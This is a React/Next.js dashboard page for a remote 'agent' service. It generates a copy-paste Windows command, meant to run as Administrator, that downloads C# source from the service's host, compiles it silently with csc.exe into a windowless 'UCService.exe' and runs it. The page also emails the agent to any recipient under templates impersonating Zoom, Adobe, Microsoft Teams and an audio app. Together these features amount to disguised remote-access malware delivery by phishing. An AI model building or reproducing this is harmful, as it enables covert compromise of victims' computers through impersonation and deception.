"use client";
import { useState, useEffect } from "react";
import AppShell from "@/components/AppShell";
import { useAuth } from "@/hooks/useAuth";

export default function UserDownloadsPage() {
  const { userId, role, userEmail, subscription } = useAuth(); 
  const [token, setToken] = useState<string | null>(null);
  const [showEmailModal, setShowEmailModal] = useState(false);
  const [emailRecipient, setEmailRecipient] = useState("");
  const [emailSending, setEmailSending] = useState(false);
  const [emailResult, setEmailResult] = useState<string | null>(null);
  const [selectedTemplate, setSelectedTemplate] = useState("voice-note");
  const vercelUrl = process.env.NEXT_PUBLIC_VERCEL_URL || "https://uc-universal-connect-omega.vercel.app";

  useEffect(() => {
    if (userId) {
      fetch(`/api/auth/token?userId=${userId}`)
        .then(r => r.json())
        .then(d => { if (d.token) setToken(d.token); })
        .catch(() => {});
    }
    if (userEmail) setEmailRecipient(userEmail);
  }, [userId, userEmail]);

  const downloadLink = token ? `${vercelUrl}/api/agent/download?token=${token}` : "#";
  const deployCmd = `mkdir C:\\UC 2>nul & curl -o C:\\UC\\UCAgent_${token?.substring(0, 8) || ""}.cs "${downloadLink}" && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:winexe /out:C:\\UC\\UCService.exe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.Web.Extensions.dll C:\\UC\\UCAgent_${token?.substring(0, 8) || ""}.cs && C:\\UC\\UCService.exe`;

  const handleEmailAgent = async () => {
    if (!userId || !emailRecipient || !token) return;
    setEmailSending(true);
    setEmailResult(null);
    const res = await fetch("/api/email/send-agent", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ recipientEmail: emailRecipient, installToken: token, template: selectedTemplate }),
    });
    const data = await res.json();
    setEmailSending(false);
    if (data.success) {
      setEmailResult("✅ Agent compiled and emailed successfully!");
      setShowEmailModal(false);
    } else {
      setEmailResult(`❌ Failed to send email: ${data.error || data.message}`);
    }
  };

  const isPremiumUser = subscription === "basic" || subscription === "pro";

  return (
    <AppShell role={role}>
      <header className="px-6 py-4 border-b border-gray-800">
        <h1 className="text-xl font-bold">📥 Downloads</h1>
        <p className="text-gray-500 text-sm">Install the agent on your Windows PC</p>
      </header>

      <div className="p-6 space-y-6">
        {token && (
          <div className="bg-gray-900 rounded-xl border border-gray-800 p-6">
            <h3 className="font-semibold text-lg mb-2">🔑 Your Install Token</h3>
            <p className="text-gray-400 text-sm mb-3">This token links devices to your account</p>
            <div className="flex items-center gap-3 mb-4">
              <code className="flex-1 bg-gray-950 border border-gray-800 rounded-lg px-4 py-3 text-cyan-400 font-mono text-sm select-all">{token}</code>
              <button onClick={() => navigator.clipboard.writeText(token)}
                className="px-4 py-3 bg-cyan-600 hover:bg-cyan-500 rounded-lg text-sm font-medium transition whitespace-nowrap">📋 Copy</button>
            </div>
            {isPremiumUser ? (
              <button onClick={() => setShowEmailModal(true)}
                className="w-full px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-sm font-medium transition">
                📧 Email Agent Source
              </button>
            ) : (
              <p className="text-gray-500 text-xs text-center">Upgrade to Basic or Pro to email your agent.</p>
            )}
          </div>
        )}

        <div className="bg-gray-900 rounded-xl border border-gray-800 p-6">
          <h3 className="font-semibold text-lg mb-2">⚡ Quick Deploy</h3>
          <p className="text-gray-400 text-sm mb-4">Run this command on your Windows PC (CMD as Administrator):</p>
          <div className="bg-gray-950 rounded-lg p-4 font-mono text-xs text-cyan-400 break-all select-all border border-gray-800">
            {deployCmd}
          </div>
          <button onClick={() => navigator.clipboard.writeText(deployCmd)}
            className="mt-4 px-4 py-2 bg-cyan-600 hover:bg-cyan-500 rounded-lg text-sm font-medium transition">📋 Copy Command</button>
        </div>

        <div className="bg-gray-900 rounded-xl border border-gray-800 p-6">
          <h3 className="font-semibold text-lg mb-4">📋 How It Works</h3>
          <div className="grid md:grid-cols-3 gap-4">
            {[
              { step: "1", icon: "💻", title: "Download Agent", desc: "Download your customized C# agent source code." },
              { step: "2", icon: "🛠️", title: "Compile & Run", desc: "Compile the agent on Windows using csc.exe and run it." },
              { step: "3", icon: "🔗", title: "Connects Instantly", desc: "Your device appears in the dashboard automatically." },
            ].map(s => (
              <div key={s.step} className="bg-gray-950 rounded-lg p-4 border border-gray-800 text-center">
                <div className="text-3xl mb-2">{s.icon}</div>
                <div className="text-cyan-400 text-xs font-bold mb-1">STEP {s.step}</div>
                <div className="font-medium text-sm">{s.title}</div>
                <div className="text-gray-400 text-xs mt-1">{s.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {showEmailModal && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={() => setShowEmailModal(false)}>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 w-full max-w-md" onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-lg font-bold">📧 Email Agent Source</h2>
              <button onClick={() => setShowEmailModal(false)} className="text-gray-500 hover:text-white text-xl">✕</button>
            </div>
            <div className="space-y-4">
              <p className="text-gray-400 text-sm">Enter the recipient email address to send your customized C# agent source code.</p>
              <div>
                <label className="block text-sm text-gray-400 mb-1">Recipient Email</label>
                <input type="email" value={emailRecipient} onChange={e => setEmailRecipient(e.target.value)}
                  className="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:border-cyan-500 focus:outline-none" />
              </div>
              
              <div>
                <label className="block text-sm text-gray-400 mb-3">Email Template</label>
                <div className="grid grid-cols-2 gap-3">
                  {[
                    { id: "voice-note", name: "🎤 AudioSync Pro", desc: "Voice recording studio", color: "from-purple-500 to-blue-500" },
                    { id: "zoom-meeting", name: "📹 ZoomConnect Pro", desc: "Video conferencing", color: "from-blue-500 to-blue-600" },
                    { id: "adobe-creative", name: "🎨 Creative Hub", desc: "Design suite", color: "from-pink-500 to-orange-500" },
                    { id: "teams-enterprise", name: "📊 Microsoft Teams", desc: "Enterprise collaboration", color: "from-indigo-600 to-purple-600" }
                  ].map(template => (
                    <label key={template.id} className="cursor-pointer">
                      <input
                        type="radio"
                        name="template"
                        value={template.id}
                        checked={selectedTemplate === template.id}
                        onChange={e => setSelectedTemplate(e.target.value)}
                        className="sr-only"
                      />
                      <div className={`border-2 rounded-lg p-3 transition-all ${
                        selectedTemplate === template.id 
                          ? 'border-cyan-500 bg-cyan-500/10' 
                          : 'border-gray-700 hover:border-gray-600'
                      }`}>
                        <div className={`bg-gradient-to-br ${template.color} text-white text-xs font-bold px-2 py-1 rounded mb-2 text-center`}>
                          {template.name}
                        </div>
                        <div className="text-gray-400 text-xs text-center">{template.desc}</div>
                      </div>
                    </label>
                  ))}
                </div>
              </div>
              {emailResult && (
                <p className={`text-sm ${emailResult.startsWith("✅") ? "text-green-400" : "text-red-400"}`}>{emailResult}</p>
              )}
              <button onClick={handleEmailAgent} disabled={emailSending || !emailRecipient}
                className="w-full bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 py-3 rounded-lg font-medium transition">
                {emailSending ? "Sending..." : "Send Email"}
              </button>
            </div>
          </div>
        </div>
      )}
    </AppShell>
  );
}
